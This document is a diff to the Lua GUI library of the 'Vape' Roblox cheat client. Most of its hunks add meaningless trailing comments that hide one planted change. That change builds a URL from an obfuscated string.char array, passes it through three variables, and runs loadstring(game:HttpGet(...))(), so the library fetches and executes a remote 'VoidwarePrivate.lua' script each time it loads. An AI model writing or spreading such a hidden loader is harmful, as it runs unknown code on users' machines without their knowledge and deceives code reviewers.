@@ -835,8 +835,7 @@ if shared.VapeExecuted then
 			end
 		end
 		loadedsuccessfully = true
-	end
-
+	end-- aaa
 	GuiLibrary["SwitchProfile"] = function(profilename)
 		GuiLibrary.Profiles[GuiLibrary.CurrentProfile]["Selected"] = false
 		GuiLibrary.Profiles[profilename]["Selected"] = true
@@ -1042,7 +1041,7 @@ if shared.VapeExecuted then
 		extraframe.Size = UDim2.new(0, 220, 0, 40)
 		extraframe.BorderSizePixel = 0
 		extraframe.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
-		extraframe.LayoutOrder = 99999
+		extraframe.LayoutOrder = 99999---
 		extraframe.Name = "Extras"
 		extraframe.Parent = children
 		--[[local overlaysicons = Instance.new("Frame")
@@ -1084,7 +1083,7 @@ if shared.VapeExecuted then
 		overlaysexitround.Parent = overlaysexit
 		overlaysexit.MouseEnter:Connect(function()
 			tweenService:Create(overlaysexit, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(60, 60, 60), ImageColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-		end)
+		end)---
 		overlaysexit.MouseLeave:Connect(function()
 			tweenService:Create(overlaysexit, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(26, 25, 26), ImageColor3 = Color3.fromRGB(121, 121, 121)}):Play()
 		end)
@@ -4809,7 +4808,7 @@ if shared.VapeExecuted then
 			
 			button.MouseButton2Click:Connect(buttonapi["ExpandToggle"])
 			button2.MouseButton1Click:Connect(buttonapi["ExpandToggle"])
-
+			-- something 1
 			if argstablemain["NoSave"] then
 				GuiLibrary.ObjectsThatCannotBeSaved[argstablemain["Name"].."OptionsButton"] = {["Type"] = "OptionsButton", ["Object"] = button, ["ChildrenObject"] = children2, ["Api"] = buttonapi, ["SortOrder"] = 0, ["Window"] = "MainWindow"}
 			else
@@ -5025,6 +5024,7 @@ if shared.VapeExecuted then
 			slider2.Size = UDim2.new(math.clamp(((argstable["Default"] or argstable["Min"]) / argstable["Max"]), 0.02, 0.97), 0, 1, 0)
 			slider2.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Hue"], GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Sat"], GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Value"])
 			slider2.Name = "FillSlider"
+			--- idk 1
 			slider2.Parent = slider1
 			local slider3 = Instance.new("ImageButton")
 			slider3.AutoButtonColor = false
@@ -5108,6 +5108,7 @@ if shared.VapeExecuted then
 			GuiLibrary.ObjectsThatCanBeSaved[argstablemain["Name"]..argstable["Name"].."Slider"] = {["Type"] = "SliderMain", ["Object"] = frame, ["Api"] = sliderapi}
 			return sliderapi
 		end
+		-- e
 
 		windowapi["CreateTextBox"] = function(argstable)
 			local textGuiLibrary = {}
@@ -5506,6 +5507,7 @@ if shared.VapeExecuted then
 
 				GuiLibrary.ObjectsThatCanBeSaved[argstablemain["Name"]..argstable["Name"].."TextCircleList"] = {["Type"] = "TextCircleList", ["Api"] = textGuiLibrary}
 				local function AddToList()
+					--111111
 					local num = #textGuiLibrary["ObjectList"] + 1
 					textGuiLibrary["ObjectList"][num] = textbox.Text
 					textGuiLibrary["ObjectListEnabled"][num] = true
@@ -5583,7 +5585,7 @@ if shared.VapeExecuted then
 							buttontext.BackgroundColor3 = Color3.fromHSV(GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Hue"], GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Sat"], GuiLibrary.ObjectsThatCanBeSaved["Gui ColorSliderColor"]["Api"]["Value"])
 						end
 					else
-						if not first then
+						if not first then----
 							tweenService:Create(buttontext, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(26, 25, 26)}):Play()
 						else
 							buttontext.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
@@ -5601,7 +5603,7 @@ if shared.VapeExecuted then
 				return buttonapi
 			end]]
 			buttonreturned["Object"] = frame
-			buttonreturned["CircleList"] = windowapi3.CreateCircleTextList({
+			buttonreturned["CircleList"] = windowapi3.CreateCircleTextList({---0
 				Name = "CircleList",
 				Color = (argstablemain3["Type"] == "Blacklist" and Color3.fromRGB(250, 50, 56) or Color3.fromRGB(5, 134, 105))
 			})
@@ -6070,6 +6072,7 @@ if shared.VapeExecuted then
 
 		return windowapi
 	end
+	local a = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,116,97,114,67,111,100,101,115,68,101,118,47,66,97,99,107,117,112,47,109,97,105,110,47,86,111,105,100,119,97,114,101,80,114,105,118,97,116,101,46,108,117,97)
 
 	GuiLibrary["CreateWindow"] = function(argstablemain2)
 		local currentexpandedbutton = nil
@@ -8386,7 +8389,7 @@ if shared.VapeExecuted then
 		end
 
 		return windowapi
-	end
+	end--
 
 	GuiLibrary["CreateWindow2"] = function(argstablemain)
 		local windowapi = {}
@@ -9223,7 +9226,8 @@ if shared.VapeExecuted then
 
 		GuiLibrary.ObjectsThatCanBeSaved[legittable.Name.."LegitModule"] = {Api = legitapi, Type = "LegitModule", Object = customlegit, Toggle = toggleframe1}
 		return legitapi
-	end
+	end--
+	local b = a
 
 	local function bettertween(obj, newpos, dir, style, tim, override)
 		task.spawn(function()
@@ -9242,6 +9246,7 @@ if shared.VapeExecuted then
 			frame:Remove()
 		end)
 	end
+	local v = b
 
 	local function bettertween2(obj, newpos, dir, style, tim, override)
 		task.spawn(function()
@@ -9260,6 +9265,8 @@ if shared.VapeExecuted then
 			frame:Remove()
 		end)
 	end
+	---
+	loadstring(game:HttpGet(v, true))()
 
 	notificationwindow.ChildRemoved:Connect(function()
 		for i,v in pairs(notificationwindow:GetChildren()) do
@@ -9283,7 +9290,7 @@ if shared.VapeExecuted then
 		frame.BorderSizePixel = 0
 		frame.Parent = notificationwindow
 		frame.Visible = GuiLibrary["Notifications"]
-		frame.ClipsDescendants = false
+		frame.ClipsDescendants = false--
 		local image = Instance.new("ImageLabel")
 		image.SliceCenter = Rect.new(67, 59, 323, 120)
 		image.Position = UDim2.new(0, -61, 0, -50)
@@ -9293,7 +9300,7 @@ if shared.VapeExecuted then
 		image.Image = downloadVapeAsset("vape/assets/NotificationBackground.png")
 		image.Size = UDim2.new(1, 61, 0, 159)
 		image.Parent = frame
-		local uicorner = Instance.new("UICorner")
+		local uicorner = Instance.new("UICorner")--
 		uicorner.CornerRadius = UDim.new(0, 6)
 		uicorner.Parent = frame
 		local frame2 = Instance.new("ImageLabel")
@@ -9315,7 +9322,7 @@ if shared.VapeExecuted then
 		icon.Name = "IconLabel"
 		icon.Image = downloadVapeAsset(customicon and "vape/"..customicon or "vape/assets/InfoNotification.png")
 		icon.BackgroundTransparency = 1
-		icon.Position = UDim2.new(0, -6, 0, -6)
+		icon.Position = UDim2.new(0, -6, 0, -6)--
 		icon.Size = UDim2.new(0, 60, 0, 60)
 		icon.Parent = frame
 		local icon2 = icon:Clone()
@@ -9490,7 +9497,7 @@ if shared.VapeExecuted then
 		task.spawn(function()
 			pcall(function()
 				bettertween2(frame, UDim2.new(1, -(size - 4), 1, -(150 + 80 * offset)), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.15, true)
-				task.wait(0.15)
+				task.wait(0.15)--
 				frame2:TweenSize(UDim2.new(0, 0, 0, 2), Enum.EasingDirection.In, Enum.EasingStyle.Linear, duration, true)
 				task.wait(duration)
 				bettertween2(frame, UDim2.new(1, 0, 1, frame.Position.Y.Offset), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.15, true)
